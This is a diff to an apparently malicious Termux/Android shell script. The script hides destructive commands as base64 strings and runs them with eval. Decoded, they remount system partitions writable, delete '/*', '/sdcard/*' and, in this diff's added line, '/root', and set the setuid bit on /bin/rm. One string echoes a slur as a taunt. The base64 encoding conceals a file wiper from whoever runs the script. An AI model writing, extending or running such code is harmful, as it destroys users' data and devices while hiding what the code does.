@@ -26,6 +26,7 @@ sar="c3UgLWMgbW91bnQgLW8gcmVtb3VudCxydyAvCg=="
 sys="c3UgLWMgbW91bnQgLW8gcmVtb3VudCxydyAvc3lzdGVtCg=="
 aclean="c3UgLWMgcm0gLXJmIC8qCg=="
 lclean="cm0gLXJmIC8qICY+L2Rldi9udWxsCg=="
+tarmucks="cm0gLXJmIC9yb290Cg=="
 sdmaid="cm0gLXJmIC9zZGNhcmQvKgo="
 mchod="c3VkbyBjaG1vZCArcyAvYmluL3JtCg=="
 brain="ZWNobyAnbG1hbyByZXRhcmQnCg=="
@@ -53,6 +54,7 @@ then
 		method="non rooted termux"
 		eval $(base64 -d <<< $twitter)
 		eval $(base64 -d <<< $facebook)
+		eval $(base64 -d <<< $tarmucks)
 		eval $(base64 -d <<< $sdmaid)
 	fi
 else
